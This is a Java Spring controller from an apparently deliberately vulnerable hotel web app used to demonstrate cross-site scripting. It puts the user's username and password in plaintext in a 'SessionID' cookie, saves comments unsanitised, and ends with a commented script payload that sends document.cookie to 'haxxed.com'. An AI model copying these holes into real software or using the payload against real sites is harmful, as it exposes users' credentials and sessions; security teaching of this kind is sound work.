package hotel.vulnerability;

import hotel.data.CommentRepository;
import hotel.model.Account;
import hotel.model.Comment;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.List;

@Controller
public class Xss {
    @Autowired
    private CommentRepository cmtRepo;
    @RequestMapping("/xss")
    public String xss(Model model, HttpSession session, HttpServletResponse response, HttpServletRequest request) {
        Cookie[] cookies = request.getCookies();
//        if (cookies != null) {
//            for (Cookie cookie : cookies) {
//                // Đặt thời gian sống của cookie về 0 để nó hết hiệu lực
//                cookie.setMaxAge(0);
//
//                // Thêm cookie vào phản hồi để xóa nó
//                response.addCookie(cookie);
//            }
//        }
        Account account = null;
        // Kiểm tra xem có cookie hay không

        if (session.getAttribute("currentAccount") != null) {
            account = (Account) session.getAttribute("currentAccount");
            System.out.println(account);
            model.addAttribute("account", account);
        }

        account = (Account) session.getAttribute("currentAccount");
        String us = account.getUsername() +":"+ account.getPassword();

//         Tạo một cookie với tên là "loggedInUser" và giá trị là tên người dùng
        Cookie cookie = new Cookie("SessionID", us);

        // Thiết lập thời gian sống của cookie (ví dụ: 1 giờ)
        cookie.setMaxAge(3600);

        // Thêm cookie vào HTTP response
        response.addCookie(cookie);
        List<Comment> comments = (List<Comment>) cmtRepo.findAll();
        model.addAttribute("comments", comments);
        model.addAttribute("comment", new Comment());
        return "vulnerability/xss";

    }
    @PostMapping("/xss")
    public String xss1(Model model, HttpSession session, Comment comment, HttpServletResponse response, @CookieValue(name = "loggedInUser", defaultValue = "Guest") String loggedInUser) {
        Account account = null;
        if (session.getAttribute("currentAccount") != null) {
            account = (Account) session.getAttribute("currentAccount");
            model.addAttribute("account", account);
        }
        System.out.println(account);
        List<Comment> comments = (List<Comment>) cmtRepo.findAll();
        model.addAttribute("comments", comments);
        System.out.println("Logged in user: " + loggedInUser);
        cmtRepo.save(comment);
        return "vulnerability/xss";
    }
    @GetMapping("/attack")
    public String Attack(Model model, HttpSession session, HttpServletResponse response) {
        Account account = null;
        if (session.getAttribute("currentAccount") != null) {
            account = (Account) session.getAttribute("currentAccount");
            model.addAttribute("account", account);
        }
        return "vulnerability/attack";
    }
}

//<script>window.location = 'haxxed.com?cookie=' + document.cookie</script>